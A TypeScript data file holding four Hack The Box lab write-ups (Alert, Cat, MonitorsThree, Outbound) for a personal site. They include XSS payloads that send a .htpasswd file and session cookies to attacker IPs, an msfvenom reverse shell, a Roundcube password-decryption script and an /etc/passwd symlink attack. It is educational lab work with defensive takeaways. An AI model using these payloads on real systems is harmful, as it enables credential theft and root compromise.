// HackTheBox write-ups. Add a new entry here to publish a new write-up.
//
// `content` is a list of typed blocks rendered by <WriteupContent />.
// Inline markup in `p`, `ul`, `ol` and `note` text supports:
//   **bold**, `inline code`, and [label](https://url)
// Live secrets (passwords, hashes, flags) are intentionally redacted.

export type WriteupBlock =
  | { t: "h"; text: string }
  | { t: "p"; text: string }
  | { t: "code"; lang?: string; code: string }
  | { t: "ul"; items: string[] }
  | { t: "ol"; items: string[] }
  | { t: "img"; src: string; alt: string; caption?: string }
  | { t: "note"; text: string };

export type Difficulty = "Easy" | "Medium" | "Hard" | "Insane";

export type Writeup = {
  slug: string;
  title: string;
  platform: string; // e.g. "Hack The Box"
  os: "Linux" | "Windows";
  difficulty: Difficulty;
  date: string; // ISO date the box retired / I solved it
  tagline: string;
  tags: string[];
  image?: string; // logo (from /public); falls back to letters
  imageFit?: "cover" | "contain";
  logo?: string; // letters when there is no image
  content: WriteupBlock[];
};

export const difficultyColor: Record<Difficulty, string> = {
  Easy: "text-accent",
  Medium: "text-yellow-400",
  Hard: "text-orange-400",
  Insane: "text-red-400",
};

const difficultyRank: Record<Difficulty, number> = {
  Easy: 0,
  Medium: 1,
  Hard: 2,
  Insane: 3,
};

const writeupList: Writeup[] = [
  /* ------------------------------------------------------------------ ALERT */
  {
    slug: "alert",
    title: "Alert",
    platform: "Hack The Box",
    os: "Linux",
    difficulty: "Easy",
    date: "2025-03-22",
    tagline: "Markdown stored XSS → LFI exfil → port-forwarded web shell",
    tags: ["XSS", "LFI", "Hash cracking", "Port forwarding", "PHP"],
    image: "/writeups/alert.png",
    imageFit: "cover",
    content: [
      { t: "h", text: "Machine info" },
      {
        t: "p",
        text: "Alert is an easy-difficulty Linux machine with a website to upload, view, and share markdown files. The site is vulnerable to cross-site scripting (XSS), which is exploited to access an internal page vulnerable to Arbitrary File Read and leveraged to gain access to a password hash. The hash is then cracked to reveal the credentials leveraged to gain SSH access to the target. Enumeration of processes running on the system shows a PHP file that is being executed regularly, which has excessive privileges for the management group our user is a member of and allows us to overwrite the file for code execution as root.",
      },
      { t: "h", text: "Recon" },
      { t: "p", text: "I started with a full `nmap` scan to map the attack surface." },
      {
        t: "code",
        lang: "bash",
        code: "nmap -sC -sV -oA alert 10.129.173.173",
      },
      {
        t: "p",
        text: "Three things stood out: **SSH** on 22, an **Apache** HTTP server on 80 serving a \"Markdown Viewer\", and a filtered unknown service on 12227. I added `alert.htb` to `/etc/hosts` and browsed to the site, which let me upload `.md` files and contact support.",
      },
      { t: "h", text: "Enumeration" },
      { t: "p", text: "Before chasing a markdown exploit I fuzzed directories and virtual hosts." },
      {
        t: "code",
        lang: "bash",
        code: "ffuf -u http://alert.htb/FUZZ -w directory-list-lowercase-2.3-big.txt -e .php\nffuf -w subdomains-top1million-110000.txt -u http://alert.htb -H \"Host: FUZZ.alert.htb\" -ac",
      },
      {
        t: "p",
        text: "Directory fuzzing exposed `messages.php` and an `uploads/` directory, and vhost fuzzing revealed a `statistics.alert.htb` subdomain protected by HTTP Basic auth — no credentials yet.",
      },
      {
        t: "img",
        src: "/writeups/images/alert-01-statistics-auth.png",
        alt: "statistics.alert.htb prompting for HTTP Basic authentication",
        caption: "statistics.alert.htb — gated behind HTTP Basic auth",
      },
      { t: "h", text: "Foothold — stored XSS + LFI" },
      {
        t: "p",
        text: "The markdown renderer turned out to be vulnerable to XSS. Markdown allows `javascript:` links, so a payload like the one below pops an alert and confirms script execution in the victim's browser (see [PortSwigger's notes](https://portswigger.net/web-security/cross-site-scripting/dom-based) and [this classic write-up](https://michelf.ca/blog/2010/markdown-and-xss/)).",
      },
      {
        t: "code",
        lang: "markdown",
        code: "[click here](javascript:document.write('<script>alert(document.domain)</script>'))",
      },
      {
        t: "img",
        src: "/writeups/images/alert-02-xss-alert.png",
        alt: "JavaScript alert dialog showing the page domain",
        caption: "alert(document.domain) fires — the markdown renderer executes script",
      },
      {
        t: "p",
        text: "When I upload a markdown file the app gives me a shareable link. If I send that link through the \"contact support\" form, an admin opens it — so I can run JavaScript in their session. `messages.php` also reads files by path, so I chained a stored XSS that uses the admin's browser to perform an **LFI** and exfiltrate the Basic-auth `.htpasswd` back to my server.",
      },
      {
        t: "code",
        lang: "html",
        code: "<script>\nfetch(\"http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd\")\n  .then(r => r.text())\n  .then(d => fetch(\"http://10.10.14.170:8000/?x=\" + encodeURIComponent(d)));\n</script>",
      },
      {
        t: "p",
        text: "Hosting a listener with `python3 -m http.server 8000` and submitting the shared link to support, I received a callback containing the hash for user **albert**.",
      },
      {
        t: "code",
        lang: "bash",
        code: "hashcat -m 1600 hash rockyou.txt   # Apache $apr1$ MD5",
      },
      {
        t: "p",
        text: "The hash cracked to a weak password *(redacted)*, which worked over SSH as `albert` and gave me the user flag.",
      },
      { t: "h", text: "Privilege escalation" },
      {
        t: "p",
        text: "`id` showed albert in the **management** group. Checking listeners, the earlier \"filtered\" port made sense — a local web app was bound to `127.0.0.1:8080`.",
      },
      {
        t: "code",
        lang: "bash",
        code: "ss -tunlip | grep LISTEN\nssh -L 8080:localhost:8080 albert@alert.htb   # forward it locally",
      },
      {
        t: "p",
        text: "The forwarded app was a website monitor under `/opt/website-monitor`, where the `monitors/` directory was group-writable by **management**. I dropped a minimal PHP web shell there, then triggered a reverse shell as the service account (running as root), which gave me the root flag.",
      },
      {
        t: "img",
        src: "/writeups/images/alert-03-root-shell.png",
        alt: "Reverse shell with root privileges on Alert",
        caption: "Reverse shell landing as the root-owned monitor service",
      },
      {
        t: "note",
        text: "Takeaway: user-supplied markdown must be sanitized before rendering, and internal services should never trust requests just because they originate from an authenticated admin browser.",
      },
    ],
  },

  /* -------------------------------------------------------------------- CAT */
  {
    slug: "cat",
    title: "Cat",
    platform: "Hack The Box",
    os: "Linux",
    difficulty: "Medium",
    date: "2025-07-05",
    tagline: "Stored XSS cookie theft → SQLi → log-leaked creds → Gitea XSS to root",
    tags: ["Stored XSS", "SQL injection", "Gitea", "Log analysis", "Port forwarding"],
    image: "/writeups/cat.png",
    imageFit: "cover",
    content: [
      { t: "h", text: "Machine info" },
      {
        t: "p",
        text: "Cat is a medium-difficulty Linux machine that features a custom PHP web application vulnerable to cross-site scripting (XSS), which can trigger an onerror event to bypass the application's security filters. Leveraging this XSS vulnerability, we can perform cookie hijacking to steal an administrator's cookie and elevate our privileges in the application. We can then perform a SQL Injection on a SQLite database to get remote code execution by storing a malicious web shell in the database. With access to the internal application database, we can recover a password from the database by cracking its hash to gain access as a user who has group membership to read server logs. These logs leak a clear-text password to a user accessing an internally hosted Gitea instance on version 1.22.0, vulnerable to an XSS attack via [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/CVE-2024-6886) due to improper input sanitization. By exploiting [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/CVE-2024-6886), we can read a private Gitea repository containing a credential for the root user.",
      },
      { t: "h", text: "Foothold — stored XSS" },
      {
        t: "p",
        text: "Cat hosts a \"best cat\" contest. The registration form reflected the cat's name unsanitized, so I registered an entry whose name carried a cookie-stealing payload, then started a listener.",
      },
      {
        t: "code",
        lang: "html",
        code: "<script>document.location='http://10.10.14.x/?c='+document.cookie;</script>",
      },
      {
        t: "img",
        src: "/writeups/images/cat-01-register-xss.png",
        alt: "Registering a contest cat whose name carries the XSS payload",
        caption: "Registering a cat with the cookie-stealing payload as its name",
      },
      {
        t: "code",
        lang: "bash",
        code: "python3 -m http.server 80",
      },
      {
        t: "img",
        src: "/writeups/images/cat-02-listener.png",
        alt: "Python HTTP server waiting for the admin's cookie",
        caption: "Listener ready to catch the admin's session cookie",
      },
      {
        t: "p",
        text: "When the admin reviewed the contest entries, their `PHPSESSID` landed in my logs. Reusing the cookie gave me access to `admin.php`.",
      },
      { t: "h", text: "SQL injection" },
      {
        t: "p",
        text: "Accepting a cat sends a `POST` to `accept_cat.php` with `catName` and `catId`. I saved the request and pointed `sqlmap` at the `catName` parameter.",
      },
      {
        t: "code",
        lang: "bash",
        code: "sqlmap -r req.txt -p catName --dbms=SQLite --level=5 --risk=3 --dump -T users",
      },
      {
        t: "p",
        text: "`catName` was injectable (boolean- and time-based blind, SQLite backend). Dumping the `users` table returned every username, email and MD5 password hash. One of them cracked online via [hashes.com](https://hashes.com), giving SSH access as **rosa** and the user flag.",
      },
      {
        t: "img",
        src: "/writeups/images/cat-03-hashes.png",
        alt: "Cracking the dumped MD5 hashes on hashes.com",
        caption: "Cracking the dumped MD5 hashes on hashes.com",
      },
      {
        t: "img",
        src: "/writeups/images/cat-04-ssh-rosa.png",
        alt: "SSH session established as rosa",
        caption: "SSH foothold as rosa",
      },
      { t: "h", text: "Pivoting — leaked credentials in logs" },
      {
        t: "p",
        text: "`linpeas` showed several services bound only to localhost, including **Gitea** on `127.0.0.1:3000`. Rosa's password didn't work there, but the Apache access log leaked another user's login in a GET query string.",
      },
      {
        t: "img",
        src: "/writeups/images/cat-05-gitea.png",
        alt: "Gitea instance reachable after port forwarding",
        caption: "Gitea exposed on localhost:3000 after forwarding the port",
      },
      {
        t: "code",
        lang: "bash",
        code: "grep axel /var/log/apache2/access.log\n# GET /join.php?loginUsername=axel&loginPassword=<redacted>",
      },
      {
        t: "p",
        text: "Those credentials worked for `su axel`, and the same password logged into Gitea after forwarding the port.",
      },
      {
        t: "img",
        src: "/writeups/images/cat-06-gitea-login.png",
        alt: "Authenticated Gitea dashboard as axel",
        caption: "Logged into Gitea as axel",
      },
      {
        t: "code",
        lang: "bash",
        code: "ssh -L 3000:localhost:3000 -L 25:localhost:25 axel@cat.htb",
      },
      { t: "h", text: "Privilege escalation — Gitea stored XSS" },
      {
        t: "p",
        text: "This Gitea version is affected by a stored XSS ([EDB-52077](https://www.exploit-db.com/exploits/52077)). An admin bot periodically reads mail, so I created a repo whose description contained a payload that fetches an internal file and exfiltrates it, then emailed the admin a link to the repo.",
      },
      {
        t: "code",
        lang: "bash",
        code: "swaks --to jobert@localhost --from axel@localhost \\\n  --header \"Subject: click link\" --body \"http://localhost:3000/axel/xss\" \\\n  --server localhost --port 25",
      },
      {
        t: "p",
        text: "The admin's browser rendered the description, triggered the fetch, and returned root's credentials to my listener — enough to `su root` and grab the root flag.",
      },
      {
        t: "note",
        text: "Takeaway: never log credentials in URLs, and HTML-escape user-controlled fields (cat names, repo descriptions) everywhere they're rendered.",
      },
    ],
  },

  /* ---------------------------------------------------------- MONITORSTHREE */
  {
    slug: "monitorsthree",
    title: "MonitorsThree",
    platform: "Hack The Box",
    os: "Linux",
    difficulty: "Medium",
    date: "2025-01-18",
    tagline: "SQLi → Cacti RCE (CVE-2024-25641) → DB creds → Duplicati backup abuse",
    tags: ["SQL injection", "CVE-2024-25641", "Cacti", "Duplicati", "Chisel"],
    image: "/writeups/monitorsthree.png",
    imageFit: "cover",
    content: [
      { t: "h", text: "Machine info" },
      {
        t: "p",
        text: "MonitorsThree is a Medium Difficulty Linux machine that features a website for a company offering networking solutions. The website has a forgotten password page vulnerable to SQL injection, which is leveraged to gain access to credentials. Further enumeration of the website reveals a subdomain featuring a Cacti instance that can be accessed with the credentials obtained from the SQL injection. The Cacti instance is vulnerable to [CVE-2024-25641](https://nvd.nist.gov/vuln/detail/CVE-2024-25641), which is leveraged to gain a foothold on the system. Further enumeration of the system reveals credentials used to access the database, where hashes are found and cracked to obtain the user password. This is then used to gain access to SSH private keys, leading to SSH access to the system. Enumeration of open ports on the system reveals a vulnerable Duplicati instance, which is leveraged to gain a shell as root.",
      },
      { t: "h", text: "Recon" },
      {
        t: "p",
        text: "A standard `nmap` scan showed SSH and an Apache site on 80. I added `monitorsthree.htb` to `/etc/hosts` and found a PHP login page, then fuzzed for content and virtual hosts.",
      },
      {
        t: "img",
        src: "/writeups/images/m3-01-nmap.png",
        alt: "nmap service scan of MonitorsThree",
        caption: "nmap service/version scan",
      },
      {
        t: "img",
        src: "/writeups/images/m3-02-login.png",
        alt: "MonitorsThree login page",
        caption: "monitorsthree.htb login page",
      },
      {
        t: "code",
        lang: "bash",
        code: "ffuf -w subdomains-top1million-110000.txt \\\n  -u http://monitorsthree.htb -H \"Host: FUZZ.monitorsthree.htb\" -fs 13560",
      },
      {
        t: "img",
        src: "/writeups/images/m3-03-ffuf-cacti.png",
        alt: "ffuf revealing the cacti subdomain",
        caption: "ffuf uncovers the cacti virtual host",
      },
      {
        t: "p",
        text: "That revealed a `cacti` subdomain running a known-vulnerable **Cacti** version. Cacti has an authenticated RCE ([GHSA-7cmj-g5qc-pj88 / CVE-2024-25641](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)) — but I needed credentials first.",
      },
      {
        t: "img",
        src: "/writeups/images/m3-04-cacti-login.png",
        alt: "Cacti login page on the subdomain",
        caption: "Cacti login page — a known-vulnerable version",
      },
      { t: "h", text: "Foothold — SQLi then Cacti RCE" },
      {
        t: "p",
        text: "The main site's `forgot_password.php` behaved differently for valid vs. invalid usernames, confirming `admin` exists. I captured a login request and let `sqlmap` work the form.",
      },
      {
        t: "img",
        src: "/writeups/images/m3-05-user-enum.png",
        alt: "forgot_password.php confirming a valid username",
        caption: "Username enumeration via forgot_password.php",
      },
      {
        t: "code",
        lang: "bash",
        code: "sqlmap -u http://monitorsthree.htb/login.php --forms --crawl 2 --dbs --dump",
      },
      {
        t: "img",
        src: "/writeups/images/m3-06-sqlmap.png",
        alt: "sqlmap enumerating the databases",
        caption: "sqlmap dumping the databases",
      },
      {
        t: "p",
        text: "Dumping the database gave the admin password hash, which cracked and — reused — logged straight into the Cacti instance. From there I followed the CVE-2024-25641 PoC: it writes an arbitrary file via Package Import, so I wrote a short PHP payload that pulls and runs an `msfvenom` ELF to get a reverse shell as `www-data`.",
      },
      {
        t: "img",
        src: "/writeups/images/m3-07-cacti-creds.png",
        alt: "Admin credentials reused successfully on Cacti",
        caption: "The cracked admin password unlocks Cacti",
      },
      {
        t: "img",
        src: "/writeups/images/m3-08-phpinfo.png",
        alt: "phpinfo page proving arbitrary file write",
        caption: "Arbitrary file write confirmed via the Package Import PoC",
      },
      {
        t: "note",
        text: "The injected PHP self-destructs after ~30 seconds, so the staged \"download + execute a reverse-shell binary\" approach is far more reliable than a one-shot web shell.",
      },
      {
        t: "code",
        lang: "bash",
        code: "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f elf -o elf\n# upgrade the shell\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
      },
      {
        t: "img",
        src: "/writeups/images/m3-09-rev-shell.png",
        alt: "Reverse shell as www-data",
        caption: "Reverse shell as www-data",
      },
      { t: "h", text: "Lateral movement — DB creds → marcus" },
      {
        t: "p",
        text: "As `www-data` I found a user **marcus** in `/home` and database credentials in the Cacti config. The `cactiuser` login let me dump the application database, which held password hashes.",
      },
      {
        t: "img",
        src: "/writeups/images/m3-10-db-creds.png",
        alt: "Database credentials found in the Cacti configuration",
        caption: "Database credentials in the Cacti config",
      },
      {
        t: "code",
        lang: "bash",
        code: "hashcat -m 0 hashes rockyou.txt",
      },
      {
        t: "p",
        text: "One hash cracked and matched marcus. I switched user, collected the user flag, and used the SSH private key in his home directory for a stable shell.",
      },
      {
        t: "img",
        src: "/writeups/images/m3-11-marcus.png",
        alt: "Switched to marcus and read the user flag",
        caption: "Switched to marcus — user flag captured",
      },
      {
        t: "img",
        src: "/writeups/images/m3-12-ssh-marcus.png",
        alt: "Stable SSH session as marcus using the private key",
        caption: "Stable shell as marcus via his SSH key",
      },
      { t: "h", text: "Privilege escalation — Duplicati" },
      {
        t: "p",
        text: "Re-running enumeration as marcus showed **Duplicati** listening on `127.0.0.1:8200`. I forwarded it with `chisel` (SSH local-forward works too).",
      },
      {
        t: "code",
        lang: "bash",
        code: "# attacker\n./chisel server --reverse --port 51234\n# target\n./chisel client 10.10.x.x:51234 R:8200:127.0.0.1:8200",
      },
      {
        t: "img",
        src: "/writeups/images/m3-13-duplicati.png",
        alt: "Duplicati login page exposed via the forwarded port",
        caption: "Duplicati reachable on localhost:8200",
      },
      {
        t: "p",
        text: "Duplicati's login can be bypassed with a known authentication flaw ([duplicati#5197](https://github.com/duplicati/duplicati/issues/5197)). Once in, Duplicati runs as root and can back up and restore any path. I configured a backup of `/source/root/root.txt`, ran it, then restored it into `/tmp` — reading the root flag out of the restored copy.",
      },
      {
        t: "img",
        src: "/writeups/images/m3-14-bypass.png",
        alt: "Authenticated Duplicati dashboard after the bypass",
        caption: "Authentication bypass successful",
      },
      {
        t: "img",
        src: "/writeups/images/m3-15-backup.png",
        alt: "Configuring a Duplicati backup of the root flag path",
        caption: "Configuring a backup of /source/root/root.txt",
      },
      {
        t: "img",
        src: "/writeups/images/m3-16-root.png",
        alt: "root.txt recovered from the restored backup",
        caption: "root.txt recovered from the restored backup",
      },
      {
        t: "p",
        text: "I also published an automated exploit for the Cacti CVE used here: [CVE-2024-25641 RCE (Cacti 1.2.26)](https://github.com/leo-mitch/CVE-2024-25641-RCE-Automated-Exploit-Cacti-1.2.26).",
      },
      {
        t: "note",
        text: "Takeaway: admin tooling like Duplicati running as root is a privilege-escalation goldmine — isolate it and keep it patched.",
      },
    ],
  },

  /* --------------------------------------------------------------- OUTBOUND */
  {
    slug: "outbound",
    title: "Outbound",
    platform: "Hack The Box",
    os: "Linux",
    difficulty: "Easy",
    date: "2025-11-15",
    tagline: "Roundcube access → DB dump → DES3-decrypt stored IMAP password → below privesc",
    tags: ["Roundcube", "3DES", "Credential decryption", "CVE-2025-27591", "Symlink attack"],
    image: "/writeups/outbound.png",
    imageFit: "cover",
    content: [
      { t: "h", text: "Machine info" },
      {
        t: "p",
        text: "Outbound is an easy-difficulty Linux machine with provided assumed breach credentials. The credentials provide access to a Roundcube instance, where the user can enumerate the version and utilize [CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113), which demonstrates post-authenticated remote code execution via PHP object deserialization. After initial access to the target, we enumerate the database and find a session for the Jacob user, which, when base64 decoded, provides an encrypted password. Using an internal tool called `decrypt.sh`, we can extract the plaintext value of the password, which allows access to Roundcube as Jacob. Jacob has two messages in his inbox: one provides him with a new, updated password for the system, and another informs him that they have been granted sudo privileges to monitor system resources with a utility called `below`, which is vulnerable to [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591) — a flaw that creates logs within the `/var/log/below` directory with excessive permissions, allowing attackers to perform symlink attacks under certain conditions. We symlink `/etc/passwd` to the `error_root.log` file and write our payload to the log file via parameter injection, thereby creating a new user with the UID of the root user.",
      },
      { t: "h", text: "Overview" },
      {
        t: "p",
        text: "Outbound centers on a **Roundcube** webmail install. The path to a shell runs through the Roundcube database: dump it, decrypt the stored IMAP password, and log in as the mailbox owner. Root then falls to a recent local CVE in the `below` monitoring tool.",
      },
      { t: "h", text: "Foothold — Roundcube database" },
      {
        t: "p",
        text: "After getting access to the Roundcube database, I queried the `users` table. Each account stores a `client_hash` and an encrypted copy of its IMAP password.",
      },
      {
        t: "code",
        lang: "bash",
        code: "mysql -u <user> -p<pass> -D roundcube -e \\\n  'SELECT user_id, username, mail_host FROM users;'",
      },
      {
        t: "p",
        text: "Roundcube encrypts those passwords with **3DES (DES-EDE3-CBC)** using the app's `des_key`, with the IV prepended to the ciphertext. Knowing the key, a short script recovers the plaintext IMAP password.",
      },
      {
        t: "code",
        lang: "python",
        code: "from base64 import b64decode\nfrom Crypto.Cipher import DES3\n\nkey = b'rcmail-!24ByteDESkey*Str'  # Roundcube des_key\n\ndef decrypt(value: str) -> str:\n    raw = b64decode(value)\n    iv, ct = raw[:8], raw[8:]\n    pt = DES3.new(key, DES3.MODE_CBC, iv).decrypt(ct)\n    return pt.rstrip(b'\\x00')[:-1].decode(errors='replace')\n\nprint(decrypt('<base64-ciphertext-from-db>'))",
      },
      {
        t: "p",
        text: "The decrypted password *(redacted)* worked over SSH as **jacob**. Reading his mailbox under `~/mail/INBOX` revealed internal notes and a second user's credentials, which led to the user flag.",
      },
      { t: "h", text: "Privilege escalation — CVE-2025-27591 (below)" },
      {
        t: "p",
        text: "The host runs **below**, a resource monitor invokable via `sudo`. It is vulnerable to a symlink attack ([CVE-2025-27591](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)): it writes a log to a predictable path without validating symlinks, so I can redirect that write to `/etc/passwd` and inject a root-equivalent account.",
      },
      {
        t: "code",
        lang: "bash",
        code: "echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass\nrm -f /var/log/below/error_root.log\nln -s /etc/passwd /var/log/below/error_root.log\nsudo /usr/bin/below\ncp /tmp/fakepass /var/log/below/error_root.log\nsu pwn",
      },
      {
        t: "p",
        text: "`su pwn` drops into a UID-0 shell, which reads the root flag.",
      },
      {
        t: "note",
        text: "Takeaway: application secrets are only as safe as the key that protects them — a hard-coded, shared encryption key makes a database dump equivalent to plaintext. And log-writing privileged tools must resolve symlinks before writing.",
      },
    ],
  },
];

// Ordered easiest → hardest; ties keep their definition order (stable sort).
export const writeups: Writeup[] = [...writeupList].sort(
  (a, b) => difficultyRank[a.difficulty] - difficultyRank[b.difficulty],
);
